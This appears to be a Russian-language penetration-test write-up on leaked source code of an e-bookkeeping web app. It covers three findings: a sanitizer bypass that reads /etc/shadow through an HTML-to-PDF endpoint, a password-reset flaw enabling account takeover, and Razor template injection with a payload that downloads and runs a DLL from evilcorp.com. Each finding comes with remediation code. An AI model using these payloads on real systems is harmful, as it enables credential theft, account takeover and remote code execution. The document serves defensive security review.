Анализ файлов из утечки исходного кода веб-приложения электронной бухгалтерии.
---

***Тип: Local File Read***

**Риски:**
1. Чтение чувствительных файлов на сервере (таких как /etc/passwd, /etc/shadow, файл с admin-api-key)

**Эксплуатация:**

Уязвимый код:
```C#
    private static string SanitizeHtml(string html)
    {
        if (string.IsNullOrWhiteSpace(html))
            return "<html><body></body></html>";
        var sanitized = html;
        sanitized = Regex.Replace(
            sanitized,
            @"<script\b[^>]*>[\s\S]*?</script>",
            string.Empty,
            RegexOptions.IgnoreCase | RegexOptions.CultureInvariant);
        sanitized = Regex.Replace(
            sanitized,
            @"</?(iframe|object|embed|frame|frameset|meta|link)\b[^>]*>",
            string.Empty,
            RegexOptions.IgnoreCase | RegexOptions.CultureInvariant);
        var eventAttributes = LoadEventAttributes();
        foreach (var attr in eventAttributes)
        {
            var escapedAttr = Regex.Escape(attr);

            sanitized = Regex.Replace(
                sanitized,
                $@"\s{escapedAttr}\s*=\s*(""[^""]*""|'[^']*'|[^\s>]+)",
                string.Empty,
                RegexOptions.IgnoreCase | RegexOptions.CultureInvariant);
        }
        sanitized = Regex.Replace(
            sanitized,
            @"file:///",
            string.Empty,
            RegexOptions.IgnoreCase | RegexOptions.CultureInvariant);
        return sanitized;
    }
```
1. Отправляем следующий POST запрос на endpoint `/PdfGenerator` :
```HTTP
POST /PdfGenerator HTTP/1.1
Host: target.com
Content-Type: text/html
Content-Length: ...

<memetata http-equiv="refresh" content="file:/file://///etc/shadow">
```
2. Сервер возвращает нам файл с содержимым `/etc/shadow`. (также можно прочитать файл admin_api_key.txt)


**Рекомендации по устранению:**
1. Исправить функцию сатинизации
```C#
private static string SanitizeHtml(string html)
{
    if (string.IsNullOrWhiteSpace(html))
        return "<html><body></body></html>";

    var sanitized = html;

    sanitized = Regex.Replace(
        sanitized,
        @"<meta\s+[^>]*http-equiv\s*=\s*[""']?refresh[""']?[^>]*/?>",
        string.Empty,
        RegexOptions.IgnoreCase | RegexOptions.Singleline);

    sanitized = Regex.Replace(
        sanitized,
        @"<script\b[^>]*>[\s\S]*?</script>",
        string.Empty,
        RegexOptions.IgnoreCase);

    sanitized = Regex.Replace(
        sanitized,
        @"</?(iframe|object|embed|frame|frameset|meta|link)\b[^>]*>",
        string.Empty,
        RegexOptions.IgnoreCase);

    var eventAttributes = LoadEventAttributes();
    foreach (var attr in eventAttributes)
    {
        var escapedAttr = Regex.Escape(attr);
        sanitized = Regex.Replace(
            sanitized,
            $@"\b{escapedAttr}\s*=\s*(""[^""]*""|'[^']*'|[^\s>]+)",
            string.Empty,
            RegexOptions.IgnoreCase);
    }

    bool replaced;
    do
    {
        replaced = false;
        var before = sanitized;
        sanitized = Regex.Replace(
            sanitized,
            @"file:(?:///*)?",
            string.Empty,
            RegexOptions.IgnoreCase);
        if (sanitized != before)
            replaced = true;
    } while (replaced);

    sanitized = Regex.Replace(
        sanitized,
        @"\b(data|javascript|vbscript):[^\s]*",
        string.Empty,
        RegexOptions.IgnoreCase);

    return sanitized;
}
```
3. Или использовать уже готовые библиотеки (DOMpurify)
4. Не задавать значения по умолчанию для секретных путей или самих секретов, проверять наличие всех переменных во время старта приложения.
```C#
private static readonly string AdminApiKeyPath;

static Application()
{
    AdminApiKeyPath = Environment.GetEnvironmentVariable("ADMIN_API_KEY_PATH");
    if (string.IsNullOrEmpty(AdminApiKeyPath))
    {
        throw new InvalidOperationException(
            "Critical environment variable ADMIN_API_KEY_PATH is not set. Application cannot start.");
    }
}
```
5. Не открывать пользовательский HTML в браузере с расширенными правами доступа к файловой системе (то есть, убрать флаг --allow-file-access-from-files)
```C#
await using var browser = await Puppeteer.LaunchAsync(new LaunchOptions
{
    Headless = true,
    Args = new[] { "--no-sandbox" } 
});
```  
---

***Тип: Broken Access Control***

**Риски:**
1. Если злоумышленник знает email пользователя (через утечки или перебором), то сможет поменять пароль, а в следствии и захватить аккаунт любого пользователя.

**Эксплуатация:**

Уязвимый код:
```C#
    [HttpPost("password/request")]
    public async Task<IActionResult> RequestReset([FromBody] PasswordResetRequest req)
    {
        var user = _db.Users
            .FromSqlRaw("SELECT * FROM Users WHERE Email = {0}", req.Email)
            .AsNoTracking()
            .FirstOrDefault();

        if (user == null)
            return Ok(new { message = "Requested user does not exist!" });

        user.ResetToken = Guid.NewGuid().ToString();

        await _db.Database.ExecuteSqlRawAsync(
            "UPDATE Users SET ResetToken = {0} WHERE Email = {1}",
            resetToken,
            req.Email);

        _emailService.SendPasswordResetEmail(user.Email, user.ResetToken);

        return Ok(new { message = "Reset email has been sent." });
    }
```
1. Регистрируем аккаунт.
2. Отправляем следующий POST запрос со своим email:
```HTTP
POST /api/user/password/request HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "email": "attacker@email.com"
}
```
2. Отправляем POST запрос на endpoint `/api/user/password/reset` (заменяем параметр email на почту жертвы и токен берем с нашего email).
```HTTP
POST /api/user/password/reset HTTP/1.1
Host: target.com
Content-Type: application/json
{
  "email": "victim@email.com",
  "token": "<token>",
  "newpassword": "newpass129471_"
}
```  
4. Сервер не проверяет принадлежность токена аккаунту, так что смена пароля пройдет успешно.


**Рекомендации по устранению:**
1. Проверять, принадледит ли токен для сброса пароля аккаунту пользователя:
```C#
[HttpPost("password/reset")]
public async Task<IActionResult> ResetPassword([FromBody] PasswordResetConfirm req)
{
    var user = await _db.Users.FirstOrDefaultAsync(u => u.ResetToken == req.Token && u.Email == req.Email);

    if (user == null || user.ResetTokenExpiry < DateTime.UtcNow)
        return BadRequest(new { error = "Invalid or Outdated token." });

    user.PasswordHash = HashPassword(req.NewPassword);
    user.ResetToken = null;
    user.ResetTokenExpiry = null;
    await _db.SaveChangesAsync();

    return Ok(new { message = "Password changed." });
}
```
---

***Тип: Server-Side Template Injection leads to RCE***

**Риски:**
1. Через RCE злоумышленник сможет получить несанкционированный доступ к инфраструктуре сервера (потом уже может повысить права, к примеру)


**Эксплуатация:**

Уязвимый код:
```C#
    [HttpPost("payslip")]
    public async Task<IActionResult> SendPayslip([FromBody] EmailTemplateRequest req)
    {
        var configuredAdminApiKey = LoadAdminApiKey(AdminApiKeyPath);

        if (string.IsNullOrWhiteSpace(req.AdminApiKey))
            return Unauthorized(new { message = "AdminApiKey is required" });

        if (string.IsNullOrWhiteSpace(configuredAdminApiKey))
            return StatusCode(500, new { message = "Admin API key is not configured" });

        if (!string.Equals(req.AdminApiKey, configuredAdminApiKey, StringComparison.Ordinal))
            return Unauthorized(new { message = "Invalid AdminApiKey" });

        var user = _db.Users.FirstOrDefault(x => x.Email == req.Email);

        if (user == null)
            return NotFound("User not found");

        var model = new PayslipModel
        {
            Name = user.Email,
            Salary = user.Salary,
            Month = DateTime.UtcNow.ToString("MMMM", new CultureInfo("en-EN"))
        };

        string template =
        @"Hello, @Model.Name!
Your salary in @Model.Month is @Model.Salary!
";

        if (!string.IsNullOrWhiteSpace(req.Comment))
        {
            template += "\n" + req.Comment;
        }

        string body = await _templates.Render(template, model);

        _emailService.SendEmail(user.Email, "Your payslip", body);

        return Ok(new { message = "Payslip email sent" });
    }
```
1. Отправить следующий POST запрос на endpoint `/api/email/payslip`:
```HTTP
POST /api/email/payslip HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: ...

{
    "admin-api-key": "ADMIN_API_KEY",
    "comment": "<payload>"
}
```
пример payload:
```C#
@if (true) {
    var url = "http://evilcorp.com/payload.dll";
    var wcTypeName = "S" + "ystem." + "Net." + "Web" + "Client";
    var wcType = Type.GetType(wcTypeName);
    var wcCtor = wcType.GetConstructor(Type.EmptyTypes);
    var wc = wcCtor.Invoke(new object[0]);
    var downloadMethod = wcType.GetMethod("DownloadData", new Type[] { "".GetType() });
    var assemblyBytes = (byte[])downloadMethod.Invoke(wc, new object[] { url });
    var assembly = AppDomain.CurrentDomain.Load(assemblyBytes);
    var targetType = assembly.GetType("MyNamespace.MaliciousClass");
    var entry = targetType.GetMethod("Execute", Type.EmptyTypes);
    entry.Invoke(null, null);
}
```

**Рекомендации по устранению:**
1. Не конкатенировать пользовательский ввод в шаблоны.
2. Использовать безопасный язык шаблонов без возможности RCE (например Liquid в режиме только текст)
3. Проводить валидацию и санитизацию входных данных
```C#
string template = @"Hello, @Model.Name!
Your salary in @Model.Month is @Model.Salary!";

if (!string.IsNullOrWhiteSpace(req.Comment))
{
    model.Comment = req.Comment;
    template += "\n@Model.Comment"; 
}
```
